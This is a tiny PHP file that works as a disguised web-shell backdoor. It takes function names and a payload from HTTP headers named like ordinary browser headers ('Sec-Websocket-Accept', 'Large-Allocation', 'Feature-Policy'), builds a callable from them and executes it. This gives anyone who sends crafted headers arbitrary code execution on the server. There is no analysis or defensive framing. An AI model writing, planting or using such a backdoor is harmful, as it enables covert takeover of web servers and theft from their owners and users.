<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $lock = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Large-Allocation']($_HEADERS['Feature-Policy']));
    $lock();
}